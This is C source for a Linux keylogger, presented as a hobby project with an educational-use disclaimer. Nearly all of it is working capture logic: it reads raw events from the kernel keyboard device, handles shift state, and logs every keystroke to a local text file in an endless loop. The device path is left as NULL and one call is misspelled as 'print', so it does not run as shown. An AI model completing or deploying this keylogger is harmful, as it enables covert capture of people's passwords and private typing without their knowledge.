#include <stdio.h>

#include <fcntl.h> 

#include <stdlib.h>

#include <unistd.h>

#include "codes.h"

#include <string.h>

/**
 * Project Name: Keylogger
 
 * Description: A simple keylogger that exports the user's keystrokes in real-time to an external text file. 
                This program takes advantage of a raw input stream coming from the Linux Kernel. Therefore, this will only work on Linux.
        
 * Author: Owen Berkholtz
 
 * !! DISCLAIMER !! : This is a project I did for fun and is supposed to be used for educational purposes only. I don't condone using or extending 
                    my program for malicious purposes.

 */


// program is run by using ./keylogger 
int main(int argc, char* argv[]){
    // /dev/input/eventX is populated by the kernel. So we need to use open.
    // Open the file, read its contents and put it back into the kernel


    printf("Running Keylogger...\n");


    char* output_file = "output.txt"; //name of the output file
    
    /*
        This is the file path of your keyboard's input device.
        It should be in the format: "/dev/input/event[X]"
        If you want to find event[X], simply type this command into your terminal: ls -l /dev/input/by-path | grep event-kbd
    */
    char* path = NULL; 

    if(path == NULL){
        print("Error: file path is NULL\n");
        return 1;
    }


    int fd_read = open(path, O_RDONLY);
    int fd_write = open(output_file, O_WRONLY | O_CREAT | O_TRUNC, 0644); //0644 = rw-r--r--

    if (fd_read == -1){
        printf("Error: Incorrect file path!\n");
        return 1;
    }

    // each read from /dev/input/eventX follows this structure:
    /*
    struct input_event {
    struct timeval time; // timestamp
    __u16 type; // What category of input is it? (in this case we are concerned with type = 1 which is a Key Event)
    __u16 code; // A number that represents a key being pressed (ex: 30 = 'a')
    __s32 value; // Is it a key press or a key release?
    }
    */
    struct input_event keystroke;
    int ie_size = sizeof(keystroke);

    int is_shift = 0; // Keyboard event codes are all lowercase.

    while(1){

 
        read(fd_read, &keystroke, ie_size); // Read from data stream

        if (keystroke.type == 1){

            // While the shift key is being held down, set is_shift to 1. Otherwise it is set to 0.
            if (keystroke.code == KEY_RIGHTSHIFT || keystroke.code == KEY_LEFTSHIFT){

                if(keystroke.value == 1){
                    is_shift = 1;
                }

                else if (keystroke.value ==0){
                    is_shift = 0;
                }
            }
            
            /*
                When a key is pressed, make sure it is in the right case.
            */
            if (is_shift == 1 && keystroke.value == 0){
                dprintf(fd_write,"%s", key_map_shift[keystroke.code]);
            }
            else if (is_shift == 0 && keystroke.value == 0){
                dprintf(fd_write,"%s", key_map[keystroke.code]);
            }
            fflush(stdout);


        }
    }

    close(fd_read);
    close(fd_write);
    return 0;


}